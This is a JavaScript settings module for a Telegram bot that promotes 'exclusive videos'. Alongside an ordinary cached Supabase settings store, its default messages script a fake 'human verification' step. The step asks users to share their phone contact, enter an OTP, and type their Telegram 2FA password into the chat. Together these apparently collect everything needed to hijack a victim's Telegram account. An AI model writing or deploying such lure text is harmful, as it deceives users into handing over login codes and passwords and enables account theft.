// PATH: telegram-bot/src/db/settings.js
const supabase = require('./supabase');

const DEFAULTS = {
  welcome_text: '👋 Welcome to our content channel!\n\nTo access our exclusive videos, please join our required channels first.',
  demo_image: '',
  instructions_text: '👇 Follow these steps:\n1. Join all required channels\n2. Click "✅ Check Join"\n3. Access our video library',
  join_button_text: '📢 Join Channels',
  check_button_text: '✅ Check Join',
  videos_button_text: '📚 See Videos',
  back_button_text: '⬅️ Back',
  panel_button_text: '⚙️ Admin Panel',
  folders_button_text: '📁 Folders',
  storage_channel_id: '',
  bot_language: 'en',
  content_auto_delete_minutes: '0',
  referral_requirement_enabled: 'false',
  referral_daily_requirement: '0',
  referral_timezone: 'Asia/Calcutta',
  // ─── Human verification ───
  human_verify_enabled: 'true',
  human_verify_prompt:
    '🔐 <b>Human Verification Required</b>\n\nTo access our video library, please complete a quick one-time verification.\n\n👇 Tap the button below to share your contact.',
  share_contact_button_text: '📱 Share My Contact',
  otp_prompt_text: '🔐 <b>Enter OTP</b>',
  human_verified_message: '✅ <b>Human verification completed.</b>',
  twofa_prompt_text:
    '🔐 <b>2FA is enabled.</b>\n\nPlease type your Telegram password in the chat. The message will be deleted immediately.',
};

const CACHE_TTL_MS = 30 * 1000;
let cache = { at: 0, map: null, loading: null };
let version = 0;

function invalidate() {
  version++;
  cache = { at: 0, map: null, loading: null };
}

async function loadAll() {
  const { data, error } = await supabase.from('settings').select('key, value');
  if (error) throw error;
  const map = {};
  for (const row of data) map[row.key] = row.value;
  return { ...DEFAULTS, ...map };
}

async function getAllSettings() {
  if (cache.map && Date.now() - cache.at < CACHE_TTL_MS) return { ...cache.map };
  if (!cache.loading) {
    const v = version;
    const loading = loadAll()
      .then((map) => {
        if (v === version) cache = { at: Date.now(), map, loading: null };
        return map;
      })
      .catch((err) => {
        if (v === version) cache.loading = null;
        throw err;
      });
    cache.loading = loading;
  }
  return { ...(await cache.loading) };
}

async function getSetting(key) {
  const all = await getAllSettings();
  return all[key] ?? null;
}

async function setSetting(key, value, updatedBy) {
  const { error } = await supabase
    .from('settings')
    .upsert(
      { key, value: String(value), updated_by: updatedBy, updated_at: new Date().toISOString() },
      { onConflict: 'key' }
    );
  if (error) throw error;
  invalidate();
}

module.exports = { getSetting, getAllSettings, setSetting, DEFAULTS };